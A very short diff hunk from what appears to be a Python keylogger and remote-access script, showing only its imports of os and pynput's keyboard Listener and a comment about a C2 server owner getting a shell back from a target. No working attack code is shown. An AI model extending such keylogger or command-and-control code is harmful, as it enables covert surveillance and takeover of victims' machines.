@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 
-
 import os                                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 from pynput.keyboard import Listener, Key
 
